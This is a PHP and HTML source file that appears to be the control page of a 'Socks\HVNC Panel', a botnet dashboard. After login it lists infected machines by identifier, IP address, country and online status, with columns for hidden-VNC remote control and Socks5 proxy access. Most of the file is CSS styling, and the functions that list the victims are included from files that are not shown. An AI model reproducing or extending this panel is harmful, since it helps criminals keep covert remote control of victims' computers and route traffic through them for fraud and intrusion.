<?php
include 'checklogin.php';
LoadUser();


if(isset($_POST['edit_comment']) && $_POST['edit_comment'] == "send"){
		SetComment();
}

?>

<html>
<head>
<title>Socks\HVNC Panel | control</title>
<meta charset=\'utf-8\'>
<link rel='stylesheet' href='./css/bootstrap.min.css'>
<link rel="stylesheet" type="text/css" href="css/panel.css" tppabs="css/panel.css" />
<link rel='stylesheet' href='./css/bootstrap-theme.min.css'>
<script src='./js/jquery.min.js'></script>
<script src='./js/bootstrap.min.js'></script>

<script src="js/rainyday.js" tppabs="js/rainyday.js"></script>
<script src="js/main.js" tppabs="js/main.js"></script>
</head>
<style>
/*------------------------------*/
@font-face {
    font-family: MuseoSansCyrl-300;
    src: url(./fonts/MuseoSansCyrl_0.otf);
}


#pagebar{
	margin:0 auto;
	width: 300px;
	text-align:center;
}

/*------------------------------*/
.main_div{
	border:3px solid #000;
	width:90%;
	margin:0 auto;
	background-color:#fff;
	//height:90%;
	overflow:auto;
	
	z-index: 2;
	position: absolute;
	top: 20px;
	left: 20px;
	right: 20px;
}


/*------------------------------*/
.main_table {
	font-family:MuseoSansCyrl-300,?Arial,?Helvetica,?sans-serif;
	font-size:15px;
	width:100%;
	margin:0 auto;
	padding:15px;
	background-color:#fff;
	text-align: center;
	border-collapse: collapse;
	border: 10px solid #fff;
}
.main_table td,th{
	border-bottom:1px solid #ddd;
	padding:5px;
	text-align: center;
}
.main_table th {
	background-color: #e5e5e5;
}
.main_table a {
	color: #000;
}
.main_table tr:hover {
	background-color: #f5f5f5;
}

/*------------------------------*/

.view_table {
	font-family:MuseoSansCyrl-300,Arial,Helvetica,sans-serif;
	font-size:14px;
	width:95%;
	margin:0 auto;
	padding:15px;
	background-color:#fff;
	text-align: center;
	border-collapse: collapse;
	border: 10px solid #fff;
}
.view_table td,th{
	border-bottom:1px solid #ddd;
	padding:5px;
	text-align: center;
}
.view_table th {
	background-color: #f8e8e2;
	font-size:18px;
}
.view_table tr:hover {
	background-color: #f5f5f5;
}
.view_table td{
	text-align:left;
}
.view_table td b{
	color:#000;
}
.view_table td i{
	color:#bbb;
}

/*-------------ICONS----------------*/
.ico-holder {
    background-image: url('./img/main-sprite.png');
    background-repeat: no-repeat;
	overflow: hidden;
    height: 24px;
    width: 26px;
	display:inline-block;
	line-height: 26px;
	padding: 2px 0 0;
	//vertical-align: top;
}
.ico-holder.colordepth {
    background-position: -142px -138px;

}

/*------------------------------*/
.main_menu{
	list-style-type: none;
	//width:90%;
    margin:0 auto;
    padding: 0;
	overflow: hidden;
	background-color:#5c5e63;
}
.main_menu li{
	float:left;
}
.main_menu li a {
    display: block;
    color: #fff;
    text-align: center;
	padding:15px 15px;
    text-decoration: none;
}
.main_menu li a:hover {
    background-color: #6a6d72;
}
.li_active{
	background-color:#535559;
}

/*------------------------------*/
.second_menu{
	list-style-type: none;
	// width:90%;
    margin:0 auto;
    padding: 0;
	overflow: hidden;
	background-color:#118eee;
}
.second_menu li{
	float:left;
}
.second_menu li a {
    display: block;
    color: white;
    text-align: center;
	padding:10px 15px;
    text-decoration: none;
}
.second_menu li a:hover {
    background-color: #33Afff;
}
</style>
<body>
<img id="background"/>
<br>
<div class='main_div'>
<ul class='main_menu'>

<li><a href=\ class='li_active'>Hi, <?php echo $_SESSION['username']; ?>!</a></li>

<?php
if($_SESSION['useradmin'] == '1'){
	echo "<li><a href=\"admin.php\">Settings</a></li>";
}

?>

<li style='float:right;background-color:#535559;'><a href='checklogin.php?logout=1'>Log Out</a></li>
</ul>

<form method='post' id='comment_form'><input type='hidden' value='send' name='edit_comment'><input type='submit' value='Edit' style="position: absolute; left: -9999px" form='comment_form'></form>

<table class="main_table">
	<tr>
		<th>#</th>
		<th>Identifier</th>
		<th>IP address</th>
		<th>Country</th>
		<th>Online</th>
		<th>HVNC</th>
		<th>Socks5</th>
		<?php
			if($_SESSION['useradmin'] != 2){
				echo "<th>Comment</th>";
			}
		
		?>
		
	</tr>
	
	<?php
		PrintTable();
	?>
	
	</table>